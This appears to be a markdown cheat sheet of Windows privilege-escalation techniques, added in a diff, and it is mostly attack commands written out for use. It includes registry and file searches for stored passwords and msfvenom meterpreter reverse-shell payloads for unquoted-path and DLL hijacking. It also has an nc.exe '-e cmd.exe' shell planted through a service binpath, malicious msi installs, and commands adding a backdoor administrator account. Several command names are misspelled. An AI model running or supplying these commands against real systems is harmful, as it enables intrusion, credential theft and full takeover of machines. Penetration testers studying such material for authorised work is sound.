@@ -1,0 +1,234 @@
+---
+title: "Windows Privilege Escalation"
+description: ""
+thumbnail: ""
+categories:
+  - ""
+tags:
+  - ""
+---
+
+### Windows Exploit/OS Reference
+
+![Windows Privilege Escalation Scripts](/img/windows-privesc-table.png)
+
+### Scripts
+* JAWS
+* Sherlock
+* Powerup
+* Google Windows Version for common exploits
+
+### Kernel Exploits
+
+* systeminfo -> look up missing kb's
+* systeminfo | findstr /B /C:"OS Name" /C:"OS * Version"
+* sherlock -> Find-AllVulns powershell
+
+### Common Kernel Exploits
+- MS16-014 - applies to: Windows 7 SP1 x86
+- MS16-016 - 'WebDAV' applies to Windows 7 SP1 x86 (Build 7601)
+- MS16-032 - applies to: Windows 7 x86/x64, Windows 8 x86/64, Windows 10, Windows Server 2008-2012 R2
+
+### Config Files
+
+Credentials in ClearText or Base64 -> once Windows in installed
+
+- c:\sysprep.inf
+
+- c:\sysprep\sysprep.xml
+
+- %WINDIR%\Panther\Unattend\Unattended.xml
+
+- %WINDIR%\Panther\Unattended.xml
+
+### GPP (Group Policy Preferences)
+
+Only applicable for devices connected to a domain
+
+- Groups.xml stored in SYSVOL -> DC, encrypted with AES, but key got leaked
+```
+\\dc2018.lab\SYSVOL\dc2008.lab\Policies\{id}\MACHINE\Preferences\Groups
+```
+
+### Other Files
+
+- Services\Services.xml
+
+- ScheduldedTasks\ScheduledTasks.xml
+
+- Printers\Printers.xml
+
+- Drives\Drives.xml
+
+- DataSources\DataSources.xml
+
+### Other Misc Passwords
+
+- ```dir /s *pass* == *cred* == *vnc* == *.config*```
+
+- ```findstr /si password *.xml *.ini *.txt```
+
+- ```reg query HKLM /f password /t REG_SZ /s```
+
+- ```reg query HKCU /f password /t REG_SZ /s```
+
+- web.config
+
+- php.ini
+
+- httpd.conf
+
+- access.log
+
+- PowerUp:
+    * Get-WebConfig (ISS > web.config)
+
+- PuTTY:
+  - ```reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions```
+
+- Tight VNC:
+
+  - ```reg query HKCU\Software\TightVNC\Server```
+
+  - ```bncpwd.exe <encrypted_password>```
+
+- Always Install Elevated:
+
+  - ```reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstalledElevated```
+
+  - ```reg query HKCU\SOFTWARE\Policies\Micorosft\Windows\Installer\AlwaysInstalledElevated```
+
+    * both values = 1, created a malicious .msi file with msfvenom for example
+
+    * execute it with ```msiexec /quiet /qn /i <filename.msi>```
+
+- PowerUp:
+
+  - ```Get-RegistryAlwaysInstallElevated```
+
+  - ```Write-UserAddMSI```
+
+### Unquoted Services Paths (Trusted Service Paths)
+
+For each space in a file path, Windows will attempt to look for and execute programs with a name that matches the word in front of the space.
+
+Example:
+
+* C:\Program Files\Some Folder\Service.exe
+
+* C:\Program.exe
+
+* C:\Program Files\Some.exe
+
+* C:\Program Files\Some Folder\Service.exe
+
+
+- ```wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """```
+
+PFNet
+* C:\Program Files (x86)\Privacyware\Privatefirewall 7.0\pfscv.exe
+* icalcs "C:\Program Files (x86)\Privacyware"
+* msfvenom -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai LHOST=10.0.0.100 LPORT=443 -f exe -o Privatefirewall.exe
+Start and stop the service:
+* sc stop PFNet
+* sc start PFNET
+Powerup:
+* Get-ServiceUnquoted
+* Write-ServiceBinary -Name <service_name> -Path <hijack_path>
+Insecure Service Permissions
+* whoami > net user <name> - enumerate groups
+* accesschk.exe -> part of sysinternals
+* accesschk.exe -ucqv <service name>
+* accesschk.exe -uwcqv "Authenticated Users" * /accepteula
+
+Write access to a service as authenticated user?
+W-XP ssdprsv and upnphost by default:
+sc qc upnphost
+sc config upnphost binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
+net start upnphost
+
+
+Powerup:
+* Get-ModifiableService
+* Test-ServiceDaclPermission
+* Invoke-ServiceAbuse -Name <service_name> -Command <command>
+
+
+### DLL Hijacking
+
+Requires User Interaction / Reboot.
+
+DLL search order on 32-bit systems:
+
+1. The directory from which the application is loaded
+
+2. 32-bit System directory (C:\Windows\System32)
+
+3. 16-bit System directory (C:\Windows\System)
+
+4. Windows directory (C:\Windows)
+
+5. The current working directory
+
+6. Directories in the PATH environment variable
+
+You can use procmon to look for vulnerable DLL's using the following filters:
+* Result is NAME NOT FOUND Include
+* Path ends with .dll
+echo %path%
+icacls C:\Python27
+accesssschk.exe -dqv "C:\Python27"
+sc qc IKEEXT
+Generate a malicious payload with msfvenom:
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<ip> lport=<port> -f dll > evil.dll
+Windows 7 x86/64:
+* IKE and AuthIP IPsec Keying Modules (IKEEEXT) - wlbsctrl.dll
+Powerup:
+* Find-PathDLLHijkack
+* Find-ProjcessDLLHijkack
+* Wire-HijkackDll
+Schedulded tasks:
+On server 2000, 2003, and XP, scheduled tasks are running as system. Are they calling any .exe's and can you overwrite?
+* accesschk.exe -dqv <folder path>
+Can you create a task yourself?
+* net start "Task Scheduler" at <hour:minute> /interactive "path to evil exe"
+Powerup:
+* Get-ModifiableScheduledTaskFile
+
+### Useful Commands
+
+- ```hostname```
+
+- ```echo %username%```
+
+- ```whoami / priv```
+
+- ```swinsta - other logged in users```
+
+- ```net users```
+
+- ```net user <username>```
+
+- ```net localgroup```
+
+- ```net localgroup Administrators```
+
+- ```net user rottenadmin P@ssword123! /add```
+
+- ```net localgroup Administrators rottenadmin /add```
+
+- ```ipconfing /all```
+
+- ```route print```
+
+- ```arp -a```
+
+- ```netstat -ano```
+
+- ```type C:\WINDOWS\System32\drivers\etc\hosts```
+
+- ```schtasks /query /fo LIST /v - scheduled task```
+
+- ```tasklist /SVC - running processes```
+
+- ```net start - started services```
